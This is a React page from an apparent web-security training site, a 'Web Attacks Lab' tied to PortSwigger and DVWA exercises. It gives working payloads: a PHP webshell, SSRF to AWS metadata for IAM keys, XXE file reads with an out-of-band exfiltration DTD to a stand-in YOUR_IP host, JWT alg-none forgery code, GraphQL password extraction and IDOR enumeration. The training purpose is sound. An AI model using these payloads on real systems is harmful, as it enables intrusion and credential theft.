'use client'
import React from 'react'
import Link from 'next/link'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050810', border: '1px solid #003a4a', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#00d4ff', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ num, children }: { num: string; children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 600, color: '#00d4ff', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ background: 'rgba(0,212,255,0.1)', border: '1px solid rgba(0,212,255,0.3)', padding: '2px 8px', borderRadius: '3px', fontSize: '0.65rem', letterSpacing: '0.15em' }}>LAB-{num}</span>
    {children}
  </h2>
)
const Alert = ({ type, children }: { type: 'objective' | 'tip'; children: React.ReactNode }) => {
  const c: Record<string, [string, string, string]> = {
    objective: ['#00d4ff', 'rgba(0,212,255,0.05)', 'OBJECTIVE'],
    tip:       ['#00ff41', 'rgba(0,255,65,0.04)', 'PRO TIP'],
  }
  const [color, bg, label] = c[type]
  return (
    <div style={{ background: bg, borderLeft: `3px solid ${color}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.25rem 0', border: `1px solid ${color}33`, borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}

export default function WebAttacksLab() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/web-attacks" style={{ color: '#5a7a5a', textDecoration: 'none' }}>WEB ATTACKS</Link>
        <span>›</span>
        <span style={{ color: '#00d4ff' }}>LAB</span>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', fontWeight: 700, color: '#00d4ff', margin: '0.5rem 0' }}>WEB ATTACKS LAB</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>PortSwigger Web Academy · DVWA · File upload · SSRF · XXE · JWT · GraphQL</p>
      </div>

      <div style={{ background: '#050810', border: '1px solid #003a4a', borderRadius: '6px', padding: '1.25rem', marginBottom: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>BEST FREE LAB PLATFORM</div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#00d4ff', marginBottom: '4px' }}>PortSwigger Web Security Academy — portswigger.net/web-security</div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', lineHeight: 1.7 }}>
          200+ free interactive labs covering every OWASP category. Each lab has a hint system and solution.
          Complete 10 labs per topic below and you will be genuinely dangerous at web application security.
        </div>
      </div>

      <H2 num="01">File Upload to RCE</H2>
      <Alert type="objective">Upload a PHP webshell bypassing extension and content-type checks. Execute commands on the server.</Alert>
      <Pre label="// PORTSWIGGER LAB PATH">{`# Lab: "Remote code execution via web shell upload"
# https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

# Steps:
# 1. Upload: shell.php with content: <?php echo system($_GET['cmd']); ?>
# 2. Note the upload path in response
# 3. Access: /files/avatars/shell.php?cmd=id

# If basic extension is blocked → PortSwigger has 8 progressive labs:
# - Bypass via content-type validation
# - Bypass via blacklist extension
# - Bypass via obfuscated extension
# - Bypass via polyglot file
# Complete all 8 in order`}</Pre>

      <H2 num="02">SSRF to Cloud Metadata</H2>
      <Alert type="objective">Exploit SSRF to reach the AWS metadata endpoint and extract IAM credentials.</Alert>
      <Pre label="// SSRF LAB">{`# PortSwigger: "SSRF with blacklist-based input filter"
# Also try: "Blind SSRF with out-of-band detection"

# Test manually in DVWA (if SSRF module available):
# Or use any app with URL fetching (image embed, webhook, etc)

# Step 1: Test basic SSRF
url=http://127.0.0.1

# Step 2: Enumerate internal ports
# Burp Intruder → payload: 1-65535 → url=http://127.0.0.1:§PORT§
# Look for different response sizes

# Step 3: Cloud metadata (AWS EC2):
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Result: AccessKeyId + SecretAccessKey + Token → configure AWS CLI:`}</Pre>

      <H2 num="03">XXE to File Read</H2>
      <Alert type="objective">Inject XXE payload into XML-consuming endpoint. Read /etc/passwd and then sensitive application config files.</Alert>
      <Pre label="// XXE LAB">{`# PortSwigger: "Exploiting XXE using external entities to retrieve files"

# Find XML endpoint (look for Content-Type: application/xml in requests)
# Common places: SOAP endpoints, file imports, RSS feeds, SVG uploads

# Payload to read /etc/passwd:
POST /process HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

# If output not reflected (blind XXE):
# Host evil.dtd on your server (python3 -m http.server 8888):
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://YOUR_IP:8888/?x=%file;'>">
# %eval;
# &exfil;

# Then in payload:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR_IP:8888/evil.dtd">
  %dtd;
]>
<root/>`}</Pre>

      <H2 num="04">JWT None Algorithm</H2>
      <Alert type="objective">Decode a JWT, modify the payload to escalate privileges, change algorithm to none, and bypass signature verification.</Alert>
      <Pre label="// JWT ATTACK LAB">{`# PortSwigger: "JWT authentication bypass via unverified signature"

# Step 1: Capture your JWT from login response
# Step 2: Decode in jwt.io or with Python:
import base64, json
token = "eyJ..."
header, payload, sig = token.split('.')
decoded = json.loads(base64.b64decode(payload + "=="))
print(decoded)

# Step 3: Modify payload (change user to admin):
decoded['sub'] = 'administrator'

# Step 4: Re-encode with algorithm none:
new_header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
new_payload = base64.b64encode(json.dumps(decoded).encode()).decode().rstrip('=')
new_token = f"{new_header}.{new_payload}."

# Step 5: Use new token in request
# Replace Authorization: Bearer OLD_TOKEN
# with: Authorization: Bearer NEW_TOKEN

# Also try JWT Tool:
python3 jwt_tool.py OLD_TOKEN -X a  # test all attacks automatically`}</Pre>

      <H2 num="05">GraphQL Introspection & Data Extraction</H2>
      <Alert type="objective">Enumerate a GraphQL API using introspection. Find hidden queries. Extract sensitive data.</Alert>
      <Pre label="// GRAPHQL LAB">{`# PortSwigger: "Accessing private GraphQL posts"

# Step 1: Find GraphQL endpoint
# Common paths: /graphql, /api/graphql, /graphql/v1, /gql

# Step 2: Run introspection query (Burp Repeater):
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "{ __schema { types { name fields { name } } } }"}

# Step 3: Look for interesting types/fields in response
# Find: user, password, admin, secret, token, hidden

# Step 4: Query the interesting data:
{"query": "{ user { id username password email } }"}

# If introspection disabled, try field suggestion attack:
{"query": "{ user { unknownField } }"}
# Error: "Cannot query field 'unknownField' on type 'User'. Did you mean 'password'?"

# Batch query to bypass rate limiting:
# Send array of queries in single request
[
  {"query": "{user(id:1){email password}}"},
  {"query": "{user(id:2){email password}}"},
  {"query": "{user(id:3){email password}}"}
]`}</Pre>

      <H2 num="06">IDOR Mass Account Enumeration</H2>
      <Alert type="objective">Use Burp Intruder to enumerate user IDs and extract data you shouldn't have access to.</Alert>
      <Pre label="// IDOR WITH BURP INTRUDER">{`# Using DVWA or any app with user ID in URL/body

# Step 1: Find ID-based endpoint
# Example: GET /api/user/profile?id=42

# Step 2: Capture in Burp → Send to Intruder

# Step 3: Configure attack:
# Positions tab → § markers around ID value
# GET /api/user/profile?id=§42§

# Step 4: Payload:
# Type: Numbers
# From: 1
# To: 500
# Step: 1

# Step 5: Start attack → sort by response length
# Identical length = same response (404/403)
# Different length = data returned = IDOR found

# Step 6: Grep responses for sensitive data:
# Options → Grep - Extract → add regex for email, name, etc

# Record every ID that returns 200 with different data
# That's your IDOR finding — document exact requests/responses`}</Pre>

      <div style={{ marginTop: '3rem', paddingTop: '2rem', borderTop: '1px solid #003a4a', display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← CONCEPT</Link>
        <Link href="/modules/malware" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#00d4ff', padding: '8px 20px', border: '1px solid rgba(0,212,255,0.4)', borderRadius: '4px', background: 'rgba(0,212,255,0.06)' }}>
          NEXT: MALWARE ANALYSIS →
        </Link>
      </div>
    </div>
  )
}
